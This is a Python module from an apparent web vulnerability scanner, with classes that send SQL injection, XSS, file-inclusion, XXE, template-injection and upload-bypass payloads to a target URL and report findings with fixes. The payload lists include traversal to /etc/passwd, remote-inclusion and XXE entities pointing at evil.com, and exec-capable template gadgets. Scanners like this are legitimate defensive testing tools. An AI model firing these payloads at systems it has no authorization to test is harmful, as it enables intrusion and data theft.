"""
v17.5: Advanced Web Application Exploitation Module
Includes: SQL Injection, XSS, LFI/RFI, XXE, SSTI, File Upload, etc.
"""
import re
import subprocess
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs
import requests
from ..core.models import Finding, Severity
from ..core.debug import debug_print
from .base import BaseTool

class SQLInjectionScanner(BaseTool):
    """Advanced SQL Injection detection with blind/time-based techniques"""
    
    def __init__(self):
        super().__init__("sql-injection-scanner")
        self.payloads = {
            'error_based': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'; pg_sleep(5)--",
            ],
            'nosql': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "this.username == this.password"}',
            ]
        }
    
    def run(self, url: str, params: Dict[str, str] = None) -> List[Finding]:
        """Scan for SQL injection vulnerabilities"""
        findings = []
        
        try:
            # Test error-based SQLi
            for param, value in (params or {}).items():
                for payload in self.payloads['error_based']:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    try:
                        resp = requests.get(url, params=test_params, timeout=5)
                        if self._detect_sql_error(resp.text):
                            findings.append(Finding(
                                title=f"SQL Injection (Error-Based) in parameter '{param}'",
                                category="Web Application",
                                severity=Severity.HIGH,
                                description=f"Error-based SQL injection detected in parameter '{param}' at {url}",
                                recommendation="Use parameterized queries/prepared statements. Validate and sanitize all user input.",
                                raw_output=resp.text[:500]
                            ))
                            break
                    except:
                        continue
            
            # Test time-based SQLi
            for param, value in (params or {}).items():
                for payload in self.payloads['time_based']:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    start = time.time()
                    try:
                        requests.get(url, params=test_params, timeout=10)
                        elapsed = time.time() - start
                        if elapsed > 4:  # Significant delay
                            findings.append(Finding(
                                title=f"SQL Injection (Time-Based) in parameter '{param}'",
                                category="Web Application",
                                severity=Severity.HIGH,
                                description=f"Time-based SQL injection detected in parameter '{param}' (delay: {elapsed:.2f}s)",
                                recommendation="Use parameterized queries. Implement input validation and rate limiting.",
                                raw_output=f"Delay detected: {elapsed:.2f} seconds"
                            ))
                            break
                    except:
                        continue
        
        except Exception as e:
            debug_print(f"  [SQLi Scanner] Error: {e}")
        
        return findings
    
    def _detect_sql_error(self, response_text: str) -> bool:
        """Detect SQL error messages in response"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "Microsoft OLE DB",
            "ODBC",
            "SQL Server",
            "Warning: mysql_",
            "valid MySQL result",
            "MySqlClient",
            "PostgreSQL query failed",
            "Warning: pg_",
            "valid PostgreSQL result",
            "Npgsql.",
            "PGException",
            "ERROR: syntax error at or near",
            "Warning: mssql_",
            "Microsoft SQL Native Client error",
            "Unclosed quotation mark",
            "quoted string not properly terminated"
        ]
        
        response_lower = response_text.lower()
        return any(error.lower() in response_lower for error in sql_errors)


class XSSScanner(BaseTool):
    """Advanced XSS detection including DOM-based and storage XSS"""
    
    def __init__(self):
        super().__init__("xss-scanner")
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg><script>alert('XSS')</script>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
        ]
    
    def run(self, url: str, params: Dict[str, str] = None) -> List[Finding]:
        """Scan for XSS vulnerabilities"""
        findings = []
        
        try:
            for param, value in (params or {}).items():
                for payload in self.payloads[:10]:  # Test top 10 payloads
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    try:
                        resp = requests.get(url, params=test_params, timeout=5)
                        if payload in resp.text or self._detect_xss_reflection(resp.text, payload):
                            findings.append(Finding(
                                title=f"Cross-Site Scripting (XSS) in parameter '{param}'",
                                category="Web Application",
                                severity=Severity.MEDIUM,
                                description=f"XSS vulnerability detected in parameter '{param}' at {url}. Payload reflected in response.",
                                recommendation="Implement Content Security Policy (CSP). Sanitize and encode all user input. Use framework's built-in XSS protection.",
                                raw_output=resp.text[:500]
                            ))
                            break
                    except:
                        continue
        
        except Exception as e:
            debug_print(f"  [XSS Scanner] Error: {e}")
        
        return findings
    
    def _detect_xss_reflection(self, response_text: str, payload: str) -> bool:
        """Detect if XSS payload is reflected in response"""
        # Check for script tags
        if "<script>" in payload.lower() and "<script>" in response_text.lower():
            return True
        # Check for event handlers
        if "onerror" in payload.lower() and "onerror" in response_text.lower():
            return True
        if "onload" in payload.lower() and "onload" in response_text.lower():
            return True
        return False


class LFIRFIScanner(BaseTool):
    """Local/Remote File Inclusion scanner"""
    
    def __init__(self):
        super().__init__("lfi-rfi-scanner")
        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../etc/hosts",
            "../../../windows/system32/drivers/etc/hosts",
            "../../../proc/self/environ",
            "../../../proc/version",
            "php://filter/read=string.rot13/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
            "expect://id",
            "file:///etc/passwd",
        ]
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "ftp://evil.com/shell.txt",
            "\\\\evil.com\\share\\shell.txt",
        ]
    
    def run(self, url: str, params: Dict[str, str] = None) -> List[Finding]:
        """Scan for LFI/RFI vulnerabilities"""
        findings = []
        
        try:
            # Test LFI
            for param, value in (params or {}).items():
                for payload in self.lfi_payloads[:5]:  # Top 5
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    try:
                        resp = requests.get(url, params=test_params, timeout=5)
                        if self._detect_file_inclusion(resp.text):
                            findings.append(Finding(
                                title=f"Local File Inclusion (LFI) in parameter '{param}'",
                                category="Web Application",
                                severity=Severity.HIGH,
                                description=f"LFI vulnerability detected in parameter '{param}' at {url}",
                                recommendation="Validate and sanitize file paths. Use whitelist of allowed files. Avoid user input in file operations.",
                                raw_output=resp.text[:500]
                            ))
                            break
                    except:
                        continue
        
        except Exception as e:
            debug_print(f"  [LFI/RFI Scanner] Error: {e}")
        
        return findings
    
    def _detect_file_inclusion(self, response_text: str) -> bool:
        """Detect file inclusion indicators"""
        indicators = [
            "root:x:0:0:",
            "[boot loader]",
            "for 16-bit app support",
            "PATH=/usr/local",
            "SERVER_SOFTWARE",
            "DOCUMENT_ROOT",
            "HTTP_ACCEPT_ENCODING",
        ]
        return any(indicator in response_text for indicator in indicators)


class XXEScanner(BaseTool):
    """XML External Entity (XXE) injection scanner"""
    
    def __init__(self):
        super().__init__("xxe-scanner")
        self.xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=file:///etc/passwd">]><foo>&xxe;</foo>""",
        ]
    
    def run(self, url: str, data: str = None) -> List[Finding]:
        """Scan for XXE vulnerabilities"""
        findings = []
        
        try:
            headers = {'Content-Type': 'application/xml'}
            for payload in self.xxe_payloads:
                try:
                    resp = requests.post(url, data=payload, headers=headers, timeout=5)
                    if self._detect_xxe_response(resp.text):
                        findings.append(Finding(
                            title="XML External Entity (XXE) Injection",
                            category="Web Application",
                            severity=Severity.HIGH,
                            description=f"XXE vulnerability detected at {url}. External entities can be processed.",
                            recommendation="Disable external entity processing in XML parsers. Use whitelist of allowed entities. Use JSON instead of XML when possible.",
                            raw_output=resp.text[:500]
                        ))
                        break
                except:
                    continue
        
        except Exception as e:
            debug_print(f"  [XXE Scanner] Error: {e}")
        
        return findings
    
    def _detect_xxe_response(self, response_text: str) -> bool:
        """Detect XXE response indicators"""
        indicators = [
            "root:x:0:0:",
            "[boot loader]",
            "for 16-bit app support",
        ]
        return any(indicator in response_text for indicator in indicators)


class SSTIScanner(BaseTool):
    """Server-Side Template Injection scanner"""
    
    def __init__(self):
        super().__init__("ssti-scanner")
        self.template_payloads = {
            'jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{self.__dict__}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
            ],
            'twig': [
                "{{7*7}}",
                "{{_self}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            ],
            'freemarker': [
                "${7*7}",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
            ],
            'velocity': [
                "#set($x=7*7)$x",
                "#set($str=$class.forName('java.lang.String'))",
            ],
            'smarty': [
                "{7*7}",
                "{php}echo 'test';{/php}",
            ],
        }
    
    def run(self, url: str, params: Dict[str, str] = None) -> List[Finding]:
        """Scan for SSTI vulnerabilities"""
        findings = []
        
        try:
            for template_type, payloads in self.template_payloads.items():
                for param, value in (params or {}).items():
                    for payload in payloads[:2]:  # Test first 2 payloads per template
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        try:
                            resp = requests.get(url, params=test_params, timeout=5)
                            if self._detect_template_injection(resp.text, payload, template_type):
                                findings.append(Finding(
                                    title=f"Server-Side Template Injection ({template_type.upper()}) in parameter '{param}'",
                                    category="Web Application",
                                    severity=Severity.HIGH,
                                    description=f"SSTI vulnerability detected in parameter '{param}' using {template_type} template engine",
                                    recommendation="Avoid user input in templates. Use sandboxed template rendering. Validate and sanitize template variables.",
                                    raw_output=resp.text[:500]
                                ))
                                break
                        except:
                            continue
        
        except Exception as e:
            debug_print(f"  [SSTI Scanner] Error: {e}")
        
        return findings
    
    def _detect_template_injection(self, response_text: str, payload: str, template_type: str) -> bool:
        """Detect template injection in response"""
        # Check for mathematical expression result
        if "{{7*7}}" in payload or "${7*7}" in payload or "{7*7}" in payload:
            if "49" in response_text:
                return True
        # Check for template-specific indicators
        if template_type == 'jinja2' and ("__class__" in response_text or "__dict__" in response_text):
            return True
        if template_type == 'twig' and "_self" in response_text:
            return True
        return False


class FileUploadScanner(BaseTool):
    """File upload vulnerability scanner"""
    
    def __init__(self):
        super().__init__("file-upload-scanner")
        self.bypass_extensions = [
            ".php.jpg", ".php.png", ".php.gif",
            ".php%00.jpg", ".php%00.png",
            ".phtml", ".phps", ".pht",
            ".php3", ".php4", ".php5",
            ".jsp.jpg", ".jspx.jpg",
            ".asp.jpg", ".aspx.jpg",
        ]
    
    def run(self, upload_url: str, file_param: str = "file") -> List[Finding]:
        """Scan for file upload vulnerabilities"""
        findings = []
        
        try:
            # Test extension bypass
            for ext in self.bypass_extensions[:5]:
                test_file = f"test{ext}"
                files = {file_param: (test_file, b"<?php phpinfo(); ?>")}
                
                try:
                    resp = requests.post(upload_url, files=files, timeout=5)
                    if resp.status_code == 200 and "phpinfo" in resp.text.lower():
                        findings.append(Finding(
                            title=f"Unrestricted File Upload - Extension Bypass ({ext})",
                            category="Web Application",
                            severity=Severity.HIGH,
                            description=f"File upload vulnerability detected. Extension bypass successful with {ext}",
                            recommendation="Validate file types by MIME type and magic bytes, not just extension. Implement file content scanning. Store uploaded files outside web root.",
                            raw_output=resp.text[:500]
                        ))
                        break
                except:
                    continue
        
        except Exception as e:
            debug_print(f"  [File Upload Scanner] Error: {e}")
        
        return findings


